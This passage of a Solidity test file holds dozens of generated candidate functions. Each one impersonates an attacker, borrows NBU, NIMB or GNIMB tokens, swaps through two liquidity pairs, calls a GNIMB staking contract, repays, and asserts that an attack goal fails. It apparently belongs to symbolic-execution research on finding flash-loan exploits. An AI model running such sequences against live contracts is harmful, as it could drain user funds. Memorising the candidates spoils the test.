        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2375(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2376(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2377(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2378(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2379(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2380(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2381(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2382(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2383(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2384(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2385(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2386(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2387(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2388(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2389(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2390(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2391(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2392(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2393(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2394(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2395(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2396(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2397(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2398(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2399(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2400(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2401(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2402(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2403(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2404(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2405(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2406(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2407(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2408(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2409(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2410(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2411(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2412(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2413(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2414(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2415(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2416(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2417(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2418(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2419(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2420(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2421(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2422(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
